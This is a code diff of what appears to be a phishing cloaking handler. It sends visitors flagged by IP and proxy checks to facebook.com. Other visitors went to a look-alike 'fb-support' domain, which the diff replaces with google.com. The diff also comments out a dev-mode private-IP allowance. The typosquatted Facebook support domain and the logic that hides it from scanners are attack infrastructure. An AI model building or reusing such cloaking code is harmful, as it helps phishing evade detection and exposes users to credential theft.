@@ -58,7 +58,7 @@ export default async function handler(req, res) {
   if (isBad) {
     return res.redirect(302, "https://www.facebook.com");
   } else {
-    return res.redirect(302, "https://lmportant-fb-support.vercel.app/");
+    return res.redirect(302, "https://google.com");
   }
 }
 
@@ -117,7 +117,7 @@ function getRealIp(req) {
   ];
 
   // Option to allow private/local IPs in dev/testing (set ALLOW_PRIVATE_IPS=1 in .env)
-  const allowPrivate = process.env.ALLOW_PRIVATE_IPS === "1" || process.env.NODE_ENV !== "production";
+ // const allowPrivate = process.env.ALLOW_PRIVATE_IPS === "1" || process.env.NODE_ENV !== "production";
 
   // Try headers first
   for (const h of headerCandidates) {
@@ -129,7 +129,7 @@ function getRealIp(req) {
     const ip = extractIpFromHeader(raw);
     if (!ip) continue;
 
-    if (allowPrivate) return ip;                 // allow localhost/private in dev
+   // if (allowPrivate) return ip;                 // allow localhost/private in dev
     if (!isPrivateIp(ip)) return ip;             // only return public IP in prod
     // if private and not allowed, continue searching other headers
   }
@@ -139,12 +139,12 @@ function getRealIp(req) {
   console.log("[getRealIp] socketAddr:", socketAddr);
   const normalizedSocketIp = normalizeSocketIp(socketAddr);
   if (normalizedSocketIp) {
-    if (allowPrivate) return normalizedSocketIp;
+   // if (allowPrivate) return normalizedSocketIp;
     if (!isPrivateIp(normalizedSocketIp)) return normalizedSocketIp;
   }
 
   // Last-resort: return null or a default in dev
-  if (allowPrivate) return "127.0.0.1";
+ // if (allowPrivate) return "127.0.0.1";
   return null;
 }
 
@@ -273,3 +273,4 @@ async function proxy5(ip) {
     return "ALLOW";
   }
 }
+
